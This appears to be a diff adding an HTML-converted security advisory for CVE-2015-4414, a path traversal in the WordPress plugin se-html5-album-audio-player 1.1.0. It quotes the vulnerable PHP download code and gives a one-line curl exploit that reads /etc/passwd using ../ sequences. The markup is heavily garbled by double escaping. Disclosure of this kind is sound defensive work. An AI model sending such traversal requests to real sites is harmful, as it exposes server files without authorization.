@@ -1,0 +1,52 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title></title>
+<meta name="generator" content="HTML::TextToHTML v2.51"/>
+</head>
+<body>
+<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
+</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
+    white-space: -moz-pre-wrap; /</em> Firefox <em>/
+    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
+    white-space: -o-pre-wrap;   /</em> Opera 7 */
+    word-wrap: break-word;<br/>
+}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 124&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Path Traversal vulnerability in Wordpress plugin se-html5-album-audio-player v1.1.0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-06-06&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/se-html5-album-audio-player/">https://wordpress.org/plugins/se-html5-album-audio-player/</a>"&gt;<a href="https://wordpress.org/plugins/se-html5-album-audio-player/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/se-html5-album-audio-player/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;<a href="https://profiles.wordpress.org/sedevelops/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://profiles.wordpress.org/sedevelops/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-06-06&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="https://profiles.wordpress.org/sedevelops/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://profiles.wordpress.org/sedevelops/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;An HTML5 Album Audio Player. A plugin to archive, present, and play collections of mp3s (or other html5 audio formats) as albums within your post.
+&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The se-html5-album-audio-player v1.1.0  plugin for wordpress has a remote file download vulnerability.  The download_audio.php file does not check to see if the user is authenticated, it only attempts to check if the path is in /wp-content/uploads which is easily defeated with ../.
+</p><p>File ./se-html5-album-audio-player/download_audio.php:
+</p><p> 3 $file_name = $<u>SERVER[&amp;#039;DOCUMENT</u>ROOT&amp;#039;] . $<u>GET[&amp;#039;file&amp;#039;];
+ 4 $is</u>in_uploads_dir = strpos($file_name, &amp;#039;/wp-content/uploads/&amp;#039;);
+ 5 // make sure it&amp;#039;s a file before doing anything!
+ 6 if( is_file($file_name) &amp;amp;&amp;amp; $is_in_uploads_dir !== false ) {
+ 7 
+</p><pre>
+ 8         // required for IE
+ 9         if(ini_get(&amp;#039;zlib.output_compression&amp;#039;)) { ini_set(&amp;#039;zlib.output_compression&amp;#039;, &amp;#039;Off&amp;#039;);         }
+10     
+11         // get the file mime type using the file extension
+12         switch(strtolower(substr(strrchr($file_name, &amp;#039;.&amp;#039;), 1))) {
+13                 case &amp;#039;pdf&amp;#039;: $mime = &amp;#039;application/pdf&amp;#039;; break;
+14                 case &amp;#039;zip&amp;#039;: $mime = &amp;#039;application/zip&amp;#039;; break;
+15                 case &amp;#039;jpeg&amp;#039;:
+16                 case &amp;#039;jpg&amp;#039;: $mime = &amp;#039;image/jpg&amp;#039;; break;
+17                 default: $mime = &amp;#039;application/force-download&amp;#039;;
+18         }
+19         header(&amp;#039;Pragma: public&amp;#039;);       // required
+20         header(&amp;#039;Expires: 0&amp;#039;);           // no cache
+21         header(&amp;#039;Cache-Control: must-revalidate, post-check=0, pre-check=0&amp;#039;);
+22         header(&amp;#039;Last-Modified: &amp;#039;.gmdate (&amp;#039;D, d M Y H:i:s&amp;#039;, filemtime ($file_name)).&amp;#039; GMT&amp;#039;);
+23         header(&amp;#039;Cache-Control: private&amp;#039;,false);
+24         header(&amp;#039;Content-Type: &amp;#039;.$mime);
+25         header(&amp;#039;Content-Disposition: attachment; filename=&amp;quot;&amp;#039;.basename($file_name).&amp;#039;&amp;quot;&amp;#039;);
+26         header(&amp;#039;Content-Transfer-Encoding: binary&amp;#039;);        
+27         header(&amp;#039;Content-Length: &amp;#039;.filesize($file_name));        // provide file size
+28         header(&amp;#039;Connection: close&amp;#039;);
+29         readfile($file_name);           // push it out
+30         exit();</pre>
+<p>The above code does not verify if a user is logged in, and do proper sanity checking if the file is outside of the uploads directory.&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-4414&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=124"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ curl http&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;//<a href="http://www.vapidlabs.com/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">www.vapidlabs.com/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisory.php?v=124">http://www.vapid.dhs.org/advisory.php?v=124</a>"&gt;<a href="http://www.vapid.dhs.org/advisory.php?v=124&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisory.php?v=124&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
+&lt;/html&gt;
+</p>
+
+</body>
+</html>
